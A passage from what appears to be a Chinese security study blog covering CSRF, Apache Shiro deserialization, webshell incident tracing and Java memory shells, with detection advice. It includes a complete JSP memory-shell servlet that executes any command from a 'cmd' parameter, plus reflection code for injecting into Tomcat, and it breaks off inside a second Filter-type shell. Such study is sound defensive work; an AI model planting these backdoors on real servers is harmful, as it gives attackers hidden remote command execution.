<li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作，而不是窃取数据。</li>
<li>整个过程攻击者并不能获取到cookie，只是冒用。</li>
<li>跨站请求可以用各种方式，图片URL，超链接，CORS，Form提交等。</li>
</ol>
<h3 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h3><p>CSRF通常从第三方网站发起，被攻击的网站只能通过增强自己针对CSRF的防护能力来提升安全性。<br>针对CSRF的特点，可以制定防护策略。</p>
<ol>
<li>在提交时要求附加本域名才能获取的信息，也就是常见的CSRF Token</li>
<li>添加refer检查<h2 id="shiro反序列化的原理"><a href="#shiro反序列化的原理" class="headerlink" title="shiro反序列化的原理"></a>shiro反序列化的原理</h2><h3 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h3>Apache Shiro框架提供了记住密码的功能，用户登录成功后会生成经过加密并编码的cookie。<br>在服务端对rememberMe的cookie值先base64解码再AES解密再反序列化，就导致了反序列化RCE漏洞<br>那么payload的构造过程也明了了。<br>命令-&gt;序列化-&gt;AES加密-&gt;base64编码<br>再这个漏洞的利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥，就非常易于收到攻击。<h3 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h3>由于Apache Shiro中通过AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle加密生成的攻击代码来构造恶意的rememberMe字段<br>随后重新请求网站，进行反序列化攻击，最终导致代码执行。<br>利用条件：这里需要获取一个可用的rememberMe的cookie值<h3 id="shiro检测key爆破原理"><a href="#shiro检测key爆破原理" class="headerlink" title="shiro检测key爆破原理"></a>shiro检测key爆破原理</h3>主要是收集各种默认的key，然后遍历默认的key去尝试<h3 id="shiro不出网并且不回显检测"><a href="#shiro不出网并且不回显检测" class="headerlink" title="shiro不出网并且不回显检测"></a>shiro不出网并且不回显检测</h3></li>
<li>通过延时的命令</li>
<li>通过写文件<h2 id="被上传webshell后如何排除入侵点"><a href="#被上传webshell后如何排除入侵点" class="headerlink" title="被上传webshell后如何排除入侵点"></a>被上传webshell后如何排除入侵点</h2>网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制器。<br>常见的手段如：</li>
<li>前后台任意文件上传</li>
<li>远程命令执行写shell</li>
<li>sql注入写入文件等</li>
</ol>
<p><strong>现象描述</strong>：<br>在web目录下发现webshell，于是对入侵过程展开了分析。</p>
<h3 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="定位时间范围"><a href="#定位时间范围" class="headerlink" title="定位时间范围"></a>定位时间范围</h4><p>通过发现webshell文件创建的时间点，去翻看相关日期的访问日志</p>
<h4 id="web日志分析"><a href="#web日志分析" class="headerlink" title="web日志分析"></a>web日志分析</h4><p>通过web日志分析，查看可以上传或者可疑的请求</p>
<h4 id="定位到漏洞点，进行漏洞分析"><a href="#定位到漏洞点，进行漏洞分析" class="headerlink" title="定位到漏洞点，进行漏洞分析"></a>定位到漏洞点，进行漏洞分析</h4><p>发现漏洞点后可以尝试根据web访问日志复现漏洞或者针对漏洞点代码进行代码审计</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>清楚webshell，并对漏洞点代码进行修复。</p>
<h2 id="java内存马了解过吗"><a href="#java内存马了解过吗" class="headerlink" title="java内存马了解过吗"></a>java内存马了解过吗</h2><p>内存马是web攻击的一种常用手段，随着攻防热度越来越高，攻防双方的博弈，流量分析，EDR等专业<br>安全设备被蓝方广泛使用，传统的文件上传webshell方式或者以文件形式驻留后门越来越容易被检测到，内存马应运而生。<br>webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程攻至web服务器的一类木马，与传统webshell的区别在于<br>webshell内存马无文件落地。利用中间件的进行执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p>
<h3 id="如何实现webshell内存马"><a href="#如何实现webshell内存马" class="headerlink" title="如何实现webshell内存马"></a>如何实现webshell内存马</h3><p>目标：访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果<br>实现：以java为例，客户端发起的web请求会依次经过Listener,Filter,Servlet三个组件，我们只要在这个请求的过程中做手脚<br>在内存中修改已有组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。</p>
<h3 id="内存马类型"><a href="#内存马类型" class="headerlink" title="内存马类型"></a>内存马类型</h3><p>根据内存马注入的方式，大致将内存马划分为两类</p>
<ol>
<li>servlet-api型：通过命令执行等方式动态注册一个新的listener,filter,servlet，从而实现命令执行等功能。<br>特定框架，容器的内存马原理与此类似，比如spring的controller内存马，tomcat的vallve内存马。</li>
<li>字节码增强型：通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="java-web-三大件"><a href="#java-web-三大件" class="headerlink" title="java web 三大件"></a>java web 三大件</h4><h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5>什么是servlet？<br>servlet是运行在web服务器或应用服务器上的程序。它负责处理用户的请求，并根据请求生成相应的返回值给用户。<br>就我个人简单理解，这和mvc中的controller差不多的作用。<h5 id="请求处理的过程"><a href="#请求处理的过程" class="headerlink" title="请求处理的过程"></a>请求处理的过程</h5>客户端发起一个http请求，比如get类型<br>Servlet容器收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。<br>Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。<br>Servlet容器调用service()方法。service()方法根据请求类型，这里是get类型调用doGet方法。<br>doXXX方法中是我们自己写的业务逻辑。业务逻辑处理完后，返回给servlet容器。然后容器将结果返回给客户端。<br>容器关闭的时候，会调用destory方法<h5 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h5></li>
<li>服务器启动时，或者第一次请求该servlet时，就会初始化一个servlet对象。也就是执行该servlet的初始化方法init</li>
<li>servlet对象去处理所有客户端请求，在service方法中进行</li>
<li>服务器关闭时，销毁这个servlet对象，执行destroy()方法</li>
<li>由JVM进行垃圾回收<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4>简介</li>
</ol>
<p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</p>
<p>基本工作原理</p>
<p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。<br>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。<br>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。<br>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。<br>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。<br>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</p>
<p>filter的生命周期</p>
<p>与servlet一样，Filter的创建和销毁也由web容器负责。 web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。<br>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
<p>filter链<br>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。</p>
<h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>简介<br>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。<br>ServletContextListener：对Servlet上下文的创建和销毁进行监听；<br>ServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；<br>HttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。<br>HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；<br>ServletRequestListener：对请求对象的初始化和销毁进行监听；<br>ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</p>
<p>用途<br>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等</p>
<h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>Tomcat<br>简介</p>
<p>简单理解，tomcat是http服务器+servlet容器。<br>Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将响应的信息封装为HttpServletResponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器</p>
<h4 id="Tomcat架构设计"><a href="#Tomcat架构设计" class="headerlink" title="Tomcat架构设计"></a>Tomcat架构设计</h4><p>前面提到过，Tomcat 的本质其实就是一个 WEB 服务器 + 一个 Servlet 容器，那么它必然需要处理网络的连接与 Servlet 的管理，因此，Tomcat 设计了两个核心组件来实现这两个功能，分别是连接器和容器，连接器用来处理外部网络连接，容器用来处理内部 Servlet。</p>
<p>一个 Tomcat 代表一个 Server 服务器，一个 Server 服务器可以包含多个 Service 服务，Tomcat 默认的 Service 服务是 Catalina，而一个 Service 服务可以包含多个连接器，因为 Tomcat 支持多种网络协议，包括 HTTP/1.1、HTTP/2、AJP 等等，一个 Service 服务还会包括一个容器，容器外部会有一层 Engine 引擎所包裹，负责与处理连接器的请求与响应，连接器与容器之间通过 ServletRequest 和 ServletResponse 对象进行交流。<br>一个engine可以对一个多个host，也就是虚拟主机，一个host可以对应多个context，也就是web应用，一个context对应多个wrapper，也就是servlet。这个映射关系，通过mapper组件来关联，mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系。Host容器的域名，Context容器中的web路径，Wrapper容器中的servlet映射的路径，这些配置信息是多层次的Map。<br><img src="https://i.loli.net/2021/08/18/XjrUSYopftmRJ1E.png" alt="1.png"></p>
<h3 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h3><p>反射提供的功能，能在运行时（动态）的</p>
<p>1.获取一个类的所有成员变量和方法</p>
<p>2.创建一个类的对象</p>
<p>a.获取对象成员变量&amp;赋值<br>b.调用对象的方法<br>c.判断对象所属的类</p>
<p>在注入内存马的过程当中，我们可能需要用到反射机制，例如注入一个servlet型的内存马，我们需要使用反射机制来获取当前的context，然后将恶意的servlet（wrapper）添加到当前的context的children中。<br>在使用Java反射机制时，主要步骤包括：</p>
<p>①获取 目标类型的Class对象<br>②通过 Class 对象分别获取Constructor类对象、Method类对象 &amp; Field 类对象<br>③通过 Constructor类对象、Method类对象 &amp; Field类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作</p>
<p>java instrumentation</p>
<p>Instrumentation是Java提供的一个来自JVM的接口，该接口提供了一系列查看和操作Java类定义的方法，例如修改类的字节码、向classLoader的classpath下加入jar文件等。使得开发者可以通过Java语言来操作和监控JVM内部的一些状态，进而实现Java程序的监控分析，甚至实现一些特殊功能（如AOP、热部署）。<br>Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互。<br>在注入内存马的过程中，我们可以利用java instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。</p>
<h3 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h3><p>这里我们以tomcat的servletAPI型内存马为例讲一下内存马的实现。下面的代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.InputStream"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.PrintWriter"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 创建恶意Servlet</span></span><br><span class="line">    Servlet servlet = <span class="keyword">new</span> Servlet() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">            String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">            PrintWriter out = servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取StandardContext</span></span><br><span class="line">    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用Wrapper对其进行封装</span></span><br><span class="line">    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();</span><br><span class="line">    newWrapper.setName(<span class="string">"jweny"</span>);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加封装后的恶意Wrapper到StandardContext的children当中</span></span><br><span class="line">    standardCtx.addChild(newWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加ServletMapping将访问的URL和Servlet进行绑定</span></span><br><span class="line">    standardCtx.addServletMapping(<span class="string">"/shell"</span>,<span class="string">"jweny"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。比如早期rebeyond师傅开发的memshell，就是通过修改org.apache.catalina.core.ApplicationFilterChain类的internalDoFilter方法来实现的，后期冰蝎最新版本的内存马为了实现更好的兼容性，选择hook javax.servlet.http.HttpServlet#service 函数，在weblogic选择hook weblogic.servlet.internal.ServletStubImpl#execute 函数。</p>
<h3 id="内存马检测与排查"><a href="#内存马检测与排查" class="headerlink" title="内存马检测与排查"></a>内存马检测与排查</h3><h4 id="源码检测"><a href="#源码检测" class="headerlink" title="源码检测"></a>源码检测</h4><p>在java中，只有被JVM加载后的类才能被调用，或者在需要时通过反射通知JVM加载。所以特征都在内存中，表现形式为被加载的class。需要通过某种方法获取到JVM的运行时内存中已加载的类， Java本身提供了Instrumentation类来实现运行时注入代码并执行，因此产生一个检测思路：注入jar包-&gt; dump已加载class字节码-&gt;反编译成java代码-&gt; 源码webshell检测。<br>这样检测比较消耗性能，我们可以缩小需要进行源码检测的类的范围，通过如下的筛选条件组合使用筛选类进行检测：<br>①新增的或修改的；<br>②没有对应class文件的<br>③xml配置中没注册的<br>④冰蝎等常见工具使用的<br>⑤filterchain中排第一的filter类</p>
<p>还有一些比较弱的特征可以用来辅助检测，比如类名称中包含shell或者为随机名，使用不常见的classloader加载的类等等。</p>
<p>另外，有一些工具可以辅助检测内存马，如java-memshell-scanner是通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马</p>
<h4 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h4><p>如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p>
<p>如果是jsp注入，日志中排查可疑jsp的访问请求。</p>
<p>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</p>
<p>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p>
<p>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</p>
<p>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p>
<h2 id="java-内存马-filter型"><a href="#java-内存马-filter型" class="headerlink" title="java 内存马 filter型"></a>java 内存马 filter型</h2><p>参考 <a href="http://wjlshare.com/archives/1529" target="_blank" rel="noopener">http://wjlshare.com/archives/1529</a><br>紧接着上面java内存马的简介，这里来简单学习下filter型内存马。<br>之前介绍内存马的时候讲到，如果注册了filter，那么请求是先经过filter才到servlet的。<br>如果动态创建一个filter并将其放在所有filter最前面，那么我们创建的filter就会最先执行。<br>如果再filter中添加恶意代码，就会达到命令执行的效果，也就有了内存webshell。</p>
<h3 id="tomcat-filter流程分析"><a href="#tomcat-filter流程分析" class="headerlink" title="tomcat filter流程分析"></a>tomcat filter流程分析</h3><p>在注入内存马之前，先来分析下正常Filter在tomcat中流程是怎么样的。<br>在具体分析流程之前我们先介绍一下后面会遇到的几个类：（最后再来分析一下</p>
<p>FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
<p>FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</p>
<p>FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</p>
<p>FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p>
<p>WebXml：存放 web.xml 中内容的类</p>
<p>ContextConfig：Web应用的上下文配置类</p>
<p>StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</p>
<p>StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p>
<p>tomcat调用filter的流程大概如下</p>
<ol>
<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
<li>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</li>
<li>filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li>
</ol>
<p>根据上面的简单总结，不难发现最开始是从 context 中获取的 FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存shell</p>
<h3 id="Filter型内存马注入"><a href="#Filter型内存马注入" class="headerlink" title="Filter型内存马注入"></a>Filter型内存马注入</h3><p>该方法只能在 tomcat 7.x 以上利用具体原因会在后文提到</p>
<p>参考链接：<a href="https://paper.seebug.org/1441/#1_1" target="_blank" rel="noopener">https://paper.seebug.org/1441/#1_1</a><br><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p>
<p>前面说到当组装我们的过滤器链的时候 ，是从context中获取到的 FiltersMaps<br>那么我们如何获取这个context 呢？</p>
<p>当我们能直接获取 request 的时候，我们这里可以直接使用如下方法<br>将我们的 ServletContext 转为 StandardContext 从而获取 context<br>ps：当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 这样我们就获取到了 context </span></span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
<p>其他的获取 context 的方法</p>
<p>从线程中获取StandardContext</p>
<p>如果没有request对象的话可以从当前线程中获取</p>
<p><a href="https://zhuanlan.zhihu.com/p/114625962" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/114625962</a></p>
<p>从MBean中获取</p>
<p><a href="https://scriptboy.cn/p/tomcat-filter-inject/" target="_blank" rel="noopener">https://scriptboy.cn/p/tomcat-filter-inject/</a></p>
<p>获取到 Context 之后 ，我们可以发现其中的 filterConfigs，filterDefs，filterMaps 这三个参数和我们的 filter 有关，那么如果我们可以控制这几个变量那么我们或许就可以注入我们的内存马<br>内存马的注入流程大致如下：</p>
<ol>
<li>创建一个恶意 Filter(恶意代码放doFilter方法里等着被调用)</li>
<li>利用 FilterDef 对 Filter 进行一个封装</li>
<li>将FilterDef 添加到 FilterDefs 和 FilterConfig</li>
<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）<br>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启<br>示例的内存马如下<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span 